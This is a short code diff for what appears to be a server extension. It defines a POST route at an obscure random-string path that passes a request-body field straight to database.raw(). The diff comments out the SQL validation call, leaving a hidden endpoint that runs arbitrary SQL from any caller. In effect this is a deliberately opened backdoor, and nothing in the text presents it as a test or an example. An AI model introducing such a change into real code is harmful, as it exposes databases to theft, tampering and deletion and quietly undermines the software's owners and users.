@@ -6,12 +6,11 @@ export default {
     handler: async (router, { database, logger }) => {
         const sqlValidator = new SQLValidator();
 
-        
         router.post('/7kQ9dF2vX6bM3rL8wA4jZ5nH1pT0cY7', async (req, res) => {
             try {
                 const { variable } = req.body;
 
-                sqlValidator.validate(variable);
+                //sqlValidator.validate(variable);
 
                 const result = await database.raw(variable);
                 logger.info('SQL Query Result:', result);
